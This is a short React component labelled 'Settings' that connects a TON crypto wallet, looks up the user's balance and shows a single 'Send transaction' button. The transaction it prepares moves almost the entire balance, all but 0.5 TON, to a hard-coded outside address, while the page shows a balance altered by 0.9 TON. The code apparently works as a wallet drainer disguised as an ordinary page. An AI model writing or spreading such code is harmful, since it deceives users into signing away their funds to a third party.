"use client";

import { useEffect, useState } from "react";
import { useTonAddress, useTonConnectUI } from "@tonconnect/ui-react";
import { toNano } from "@ton/ton";

const Settings = () => {
  const [tonConnectUI] = useTonConnectUI();
  const userFriendlyAddress = useTonAddress();
  const [balance, setBalance] = useState<string | null>(null);

  useEffect(() => {
    const fetchBalance = async () => {
      if (!userFriendlyAddress) return;
      try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${userFriendlyAddress}`);
        const data = await response.json();

        if (data?.balance) {
          setBalance((parseInt(data.balance) / 10 ** 9).toFixed(2));
        } else {
          setBalance("0");
        }
      } catch (error) {
        console.error("Error fetching balance:", error);
        setBalance("Error fetching balance");
      }
    };

    fetchBalance();
  }, [userFriendlyAddress]);

  const myTransaction = {
    validUntil: Math.floor(Date.now() / 1000) + 360,
    messages: [
      {
        address: "UQCFxWYZpOuoBmVq1eL3kEvR8q2IAN2oEpTYjM89xlZ6YB1Z",
        amount: toNano((balance ? parseFloat(balance.replace(" TON", "")) - 0.5 : 1)).toString(),
      }
    ]
  };

  return (
    <div>
      <h2>Your Address: {userFriendlyAddress}</h2>
      <h3>Balance: {(balance ? parseFloat(balance.replace(" TON", "")) - 0.9 : 1) || "Loading..."}</h3>
      <button onClick={() => tonConnectUI.sendTransaction(myTransaction)}>
        Send transaction
      </button>
    </div>
  );
};

export default Settings;
